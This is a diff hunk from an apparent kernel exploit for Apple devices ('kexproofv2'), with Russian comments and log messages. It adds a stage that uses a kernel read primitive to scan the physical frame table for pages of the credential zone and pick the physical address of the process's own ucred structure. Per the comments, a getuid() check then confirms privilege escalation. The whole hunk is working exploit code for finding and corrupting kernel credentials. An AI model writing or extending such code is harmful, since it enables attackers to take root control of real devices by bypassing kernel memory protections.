@@ -8385,7 +8385,39 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2-BAND] финиш: чтений=%llu ucredPA=%#llx roFieldPA=%#llx",
                                       (unsigned long long)bandReads, (unsigned long long)pagePA, (unsigned long long)roFieldPA]);
                         }
-                        // kexproofv2 2.0.14 [VMPROBE] — страницы зоны через vm_page.
+                        // kexproofv2 2.0.15 [T18-ENUM] — работает без sizeof vm_page.
+                        // Образец чужого ucred дал тип кадра 0x18 (он же у proc_ro).
+                        // Все кадры типа 0x18 из frame table = страницы наших зон;
+                        // скан уже покрыл все ≥256MB → низкие и есть кандидаты на
+                        // нашу ucred-страницу. Frame table — kread, безопасно.
+                        if (!pagePA && gFrameTableVA) {
+                            int uType = gUcredSamplePA ? kpFrameTypeOf(gUcredSamplePA) : 0x18;
+                            uint64_t t18lo[16]; uint32_t n18lo = 0, n18hi = 0, n18all = 0;
+                            kpNote(r, [NSString stringWithFormat:@"  [T18-ENUM] перебор кадров типа %d из frame table (наш ucred — в зоне этого типа)",
+                                      uType]);
+                            for (uint64_t i = 0; i < nF; i++) {
+                                uint64_t pa = pB + (i << 14);
+                                if (kpFrameTypeOf(pa) != uType) continue;
+                                n18all++;
+                                if (pa < pB + 0x10000000ULL) {
+                                    if (n18lo < 16) t18lo[n18lo++] = pa;
+                                } else n18hi++;
+                            }
+                            kpNote(r, [NSString stringWithFormat:@"  [T18-ENUM] кадров типа %d: всего %u, высоких %u, низких %u",
+                                      uType, n18all, n18hi, n18lo]);
+                            for (uint32_t i = 0; i < n18lo; i++)
+                                kpNote(r, [NSString stringWithFormat:@"  [T18-ENUM] низкий кандидат[%u] pa=%#llx", i, (unsigned long long)t18lo[i]]);
+                            if (n18lo == 1) {
+                                pagePA = t18lo[0];
+                                gVmpProbeFaith = YES;
+                                kpNote(r, [NSString stringWithFormat:@"  [T18-ENUM] единственный низкий кандидат — берём на веру: pa=%#llx", (unsigned long long)pagePA]);
+                            } else if (n18lo > 1) {
+                                // несколько: пробуем по порядку, INPL проверит getuid()
+                                pagePA = t18lo[0];
+                                gVmpProbeFaith = YES;
+                                kpNote(r, [NSString stringWithFormat:@"  [T18-ENUM] низких %u — пробуем первый pa=%#llx (список выше для добора)", n18lo, (unsigned long long)pagePA]);
+                            }
+                        }
                         // Слепой скан закрыт (ucred физически <256MB — DART слеп там,
                         // kernel-чтения убивают). Идём с другой стороны: у чужого
                         // ucred известен PA → его vm_page → vmp_object (объект зоны
